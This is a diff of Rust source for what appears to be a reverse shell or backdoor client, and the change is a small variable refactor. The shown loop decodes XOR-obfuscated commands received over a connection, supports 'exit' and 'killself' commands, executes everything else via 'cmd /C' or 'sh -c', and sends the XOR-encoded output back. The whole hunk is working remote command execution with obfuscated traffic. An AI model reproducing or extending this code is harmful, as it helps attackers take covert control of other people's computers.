@@ -34,19 +34,20 @@ fn main() {
 							/* Remove Null byte in command (Error while running commands*/
 							/* https://stackoverflow.com/a/49406848 */
 							command = command.trim_matches(char::from(0));
-							let tmp = int_xor(command, key);
-							command = &*tmp;
-							if command == "exit\n" {
+//							command = &*int_xor(command, key);
+							let cmd = &*int_xor(command, key);
+//							command = tmp;
+							if cmd == "exit\n" {
 								break;
 							}
-							else if command == "killself\n" {
+							else if cmd == "killself\n" {
 								return;
 							}
 							else {
 								let output = if cfg!(target_os = "windows") {
-									Command::new("cmd").args(&["/C", command]).output().unwrap()
+									Command::new("cmd").args(&["/C", cmd]).output().unwrap()
 								} else {
-									Command::new("sh").arg("-c").arg(command).output().unwrap()
+									Command::new("sh").arg("-c").arg(cmd).output().unwrap()
 								};
 								conn.write(int_xor(from_utf8(&output.stdout).unwrap(), key).as_bytes()).unwrap();
 							}
